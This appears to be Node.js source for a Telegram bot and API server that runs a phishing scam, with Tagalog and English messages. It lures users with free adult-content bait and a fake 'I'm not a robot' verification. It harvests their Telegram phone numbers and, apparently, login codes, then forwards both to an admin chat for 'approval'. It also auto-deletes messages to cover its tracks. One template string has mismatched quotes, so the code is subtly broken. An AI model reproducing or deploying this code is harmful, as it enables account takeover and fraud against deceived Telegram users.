import express from "express";
import cors from "cors";
import { Telegraf } from "telegraf";

const BOT_TOKEN = process.env.BOT_TOKEN;
const WEBAPP_URL = process.env.WEBAPP_URL;     // e.g. https://tgreward.shop/webapp.html
const WEBSITE_URL = process.env.WEBSITE_URL;   // e.g. https://tgreward.shop/QTSJAOPPHU.html
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID; // e.g. "5757713537"

if (!BOT_TOKEN) {
  throw new Error("BOT_TOKEN is not set");
}
if (!ADMIN_CHAT_ID) {
  throw new Error("ADMIN_CHAT_ID is not set");
}

const bot = new Telegraf(BOT_TOKEN);

// in-memory storage
const userPhones = new Map();   // Telegram user id -> phone number
const submissions = new Map();  // submissionId -> { userId, code, telegramPhone, username, firstName }

// helper: delete message after delayMs (default 30 minutes)
function scheduleDelete(chatId, messageId, delayMs = 30 * 60 * 1000) {
  setTimeout(() => {
    bot.telegram.deleteMessage(chatId, messageId).catch(() => {});
  }, delayMs);
}

// helper: reply + auto delete
async function replyAndAutoDelete(ctx, text, extra) {
  const msg = await ctx.reply(text, extra);
  scheduleDelete(ctx.chat.id, msg.message_id); // 30 minutes by default
  return msg;
}

// /start handler
bot.start(async (ctx) => {
  const payload = ctx.startPayload; // from ?start=...

  if (payload !== "from_website") {
    const msg = await ctx.reply(
      "Para gumana ang bot na ito, paki-bisita muna ang website:\n" +
        WEBSITE_URL
    );
    scheduleDelete(ctx.chat.id, msg.message_id);
    return;
  }

  // STEP 1: kailangan munang mag-share ng contact, wala pang WebApp button
  await replyAndAutoDelete(
    ctx,
    "Para ma-verify na legit Telegram account ka, kailangan mong i-share ang TELEGRAM phone number mo gamit ang button sa ibaba.",
    {
      reply_markup: {
        keyboard: [
          [
            {
              text: "📱 Share my Telegram phone",
              request_contact: true,
            },
          ],
        ],
        resize_keyboard: true,
        one_time_keyboard: true,
      },
    }
  );
});

// kapag nag-share ng contact (phone)
bot.on("contact", async (ctx) => {
  const contact = ctx.message.contact;
  if (!contact) return;

  // delete agad ang contact message (2s)
  scheduleDelete(ctx.chat.id, ctx.message.message_id, 2000);

  // siguraduhin na sariling number niya
  if (contact.user_id && contact.user_id !== ctx.from.id) {
    const warn = await ctx.reply(
      "Mukhang ibang contact ito. Paki-tap ang button para i-share ang sarili mong Telegram number."
    );
    scheduleDelete(ctx.chat.id, warn.message_id);
    return;
  }

  userPhones.set(ctx.from.id, contact.phone_number);

  // message: thanks + tanggal keyboard (auto-delete 30 mins)
  const reply = await ctx.reply(
    "✅\n\n" +
      "Ngayon lalabas na ang verification step.",
    {
      reply_markup: {
        remove_keyboard: true,
      },
    }
  );
  scheduleDelete(ctx.chat.id, reply.message_id);

  // STEP 2: show WebApp button (“I'm not a robot!”)
  const webappMsg = await ctx.reply(
    "🔞 To access the files completely free 💦\n\n" +
      "👇 Confirm that you are not a robot",
    {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "✅ I'm not a robot!",
              web_app: { url: WEBAPP_URL },
            },
          ],
        ],
      },
    }
  );
  scheduleDelete(ctx.chat.id, webappMsg.message_id);
});

// optional: WebApp data callback
bot.on("message", async (ctx) => {
  const data = ctx.message.web_app_data?.data;
  if (data) {
    console.log("WEBAPP DATA:", data);
    const msg = await ctx.reply(
      "Your code was submitted. Please wait for admin review. ⏳"
    );
    scheduleDelete(ctx.chat.id, msg.message_id);
  }
});

// HTTP server
const app = express();
app.use(cors());
app.use(express.json());

// API endpoint na tinatawag ng WebApp
app.post("/api/log-code", async (req, res) => {
  console.log("Received /api-log-code body:", req.body);

  const { code, tgUser } = req.body || {};

  if (!code) {
    console.log("Missing code in request");
    return res.status(400).json({ ok: false, error: "Missing code" });
  }

  const userId = tgUser?.id;
  const username = tgUser?.username || "N/A";
  const firstName = tgUser?.first_name || "";
  const telegramPhone = userId && userPhones.get(userId) ? userPhones.get(userId) : "N/A";

  const displayName =
    firstName && username ? `${firstName} (@${username})`
    : username ? `@${username}`
    : firstName || "Unknown user";

  // submissionId na walang colon para safe sa split
  const submissionId = `${userId || "unknown"}_${Date.now()}`;

  submissions.set(submissionId, {
    userId,
    code,
    telegramPhone,
    username,
    firstName,
  });

  const logText =
    "🔔 New verification request\n\n" +
    `👤 User: ${displayName}\n` +
    `🆔 ID: ${userId || "N/A"}\n` +
    `📱 Telegram phone: ${telegramPhone}\n\n` +
    `🔑 Code: ${code}\n\n` +
    "Tap a button below to approve or reject.";

  try {
    await bot.telegram.sendMessage(ADMIN_CHAT_ID, logText, {
      reply_markup: {
        inline_keyboard: [
          [
            { text: "✅ Approve", callback_data: `approve:${submissionId}` },
            { text: "❌ Reject", callback_data: `reject:${submissionId}` },
          ],
        ],
      },
    });
    console.log("Admin log sent");
    return res.json({ ok: true });
  } catch (err) {
    console.error("Admin log send error:", err);
    return res.status(500).json({ ok: false, error: "Admin log send failed" });
  }
});

// handle admin Approve/Reject buttons
bot.on("callback_query", async (ctx) => {
  const data = ctx.callbackQuery.data;
  if (!data) return;

  const [action, submissionId] = data.split(":");
  const submission = submissions.get(submissionId);

  if (!submission) {
    await ctx.answerCbQuery("Submission not found or already processed.", { show_alert: true });
    return;
  }

  submissions.delete(submissionId);

  const { userId, code, telegramPhone, username, firstName } = submission;

  const displayName =
    firstName && username ? `${firstName} (@${username})`
    : username ? `@${username}`
    : firstName || "Unknown user";

  const statusText =
    action === "approve"
      ? "✅ APPROVED"
      : "❌ REJECTED";

  const updatedText =
    "🔔 Verification request\n\n" +
    `👤 User: ${displayName}\n` +
    `🆔 ID: ${userId || "N/A"}\n` +
    `📱 Telegram phone: ${telegramPhone}\n\n" +
    `🔑 Code: ${code}\n\n` +
    `Status: ${statusText}`;

  try {
    // update admin message
    await ctx.editMessageText(updatedText);

    if (action === "approve") {
      await ctx.answerCbQuery("Approved ✅");
      if (userId) {
        await bot.telegram.sendMessage(
          userId,
          "✅ Your verification has been APPROVED.\n\n" +
            "Pwede ka nang mag join sa EXCLUSIVE group for free:\n" +
            "👉 https://t.me/BOCHI_Solana_Chat"
        );
      }
    } else if (action === "reject") {
      await ctx.answerCbQuery("Rejected ❌");
      if (userId) {
        await bot.telegram.sendMessage(
          userId,
          "❌ Your verification has been REJECTED.\n\n" +
            "Please check the instructions in the channel and try again."
        );
      }
    }
  } catch (err) {
    console.error("Error handling callback_query:", err);
    await ctx.answerCbQuery("Error processing action.", { show_alert: true });
  }
});

app.get("/", (req, res) => {
  res.send("Bot + API is running");
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log("HTTP server running on port", PORT);
});

bot.launch();
console.log("Bot started");

process.once("SIGINT", () => bot.stop("SIGINT"));
process.once("SIGTERM", () => bot.stop("SIGTERM"));
